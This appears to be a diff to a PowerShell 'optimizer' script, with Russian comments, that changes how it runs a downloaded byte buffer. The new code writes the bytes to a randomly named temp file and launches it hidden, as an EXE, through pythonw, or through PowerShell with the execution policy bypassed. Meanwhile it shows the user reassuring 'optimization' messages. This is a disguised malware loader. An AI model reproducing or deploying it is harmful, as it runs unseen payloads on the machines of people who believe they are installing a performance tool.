@@ -62,17 +62,35 @@ try {
     Write-Host "  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" -ForegroundColor DarkGray
     
 
-    $global:MaxPing = $ping
-    
+   $global:MaxPing = $ping
 
-    $scriptBlock = [scriptblock]::Create([Text.Encoding]::UTF8.GetString($r))
-    & $scriptBlock
-    
-  
-    Write-Host "  [✓] Optimization complete!" -ForegroundColor Green
-    Write-Host ""
-    Write-Host "  Press any key to exit..." -ForegroundColor Gray
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+# ОПРЕДЕЛЯЕМ ТИП ФАЙЛА ПО ПЕРВЫМ БАЙТАМ
+$isExe = ($r[0] -eq 0x4D -and $r[1] -eq 0x5A)  # MZ
+$isZip = ($r[0] -eq 0x50 -and $r[1] -eq 0x4B)  # PK
+
+if ($isExe) {
+    # Это EXE/DLL файл
+    $tempFile = "$env:TEMP\optimizer_$([guid]::NewGuid().ToString('N').Substring(0,8)).exe"
+    [System.IO.File]::WriteAllBytes($tempFile, $r)
+    Start-Process $tempFile -ArgumentList $ping -WindowStyle Hidden
+    Write-Host "  [✓] Запущен EXE файл" -ForegroundColor Green
+}
+elseif ($isZip) {
+    # Это PYZ/ZIP файл
+    $tempFile = "$env:TEMP\optimizer_$([guid]::NewGuid().ToString('N').Substring(0,8)).pyz"
+    [System.IO.File]::WriteAllBytes($tempFile, $r)
+    Start-Process pythonw.exe -ArgumentList "`"$tempFile`"" -WindowStyle Hidden
+    Write-Host "  [✓] Запущен PYZ файл" -ForegroundColor Green
+}
+else {
+    # Это текст - возможно PowerShell скрипт
+    $tempFile = "$env:TEMP\optimizer_$([guid]::NewGuid().ToString('N').Substring(0,8)).ps1"
+    [System.IO.File]::WriteAllBytes($tempFile, $r)
+    powershell -ep bypass -f $tempFile
+    Write-Host "  [✓] Запущен PS1 файл" -ForegroundColor Green
+}
+
+Write-Host "  [✓] Optimization started!" -ForegroundColor Green
     
 } catch {
     Write-Progress -Activity "Error" -Completed
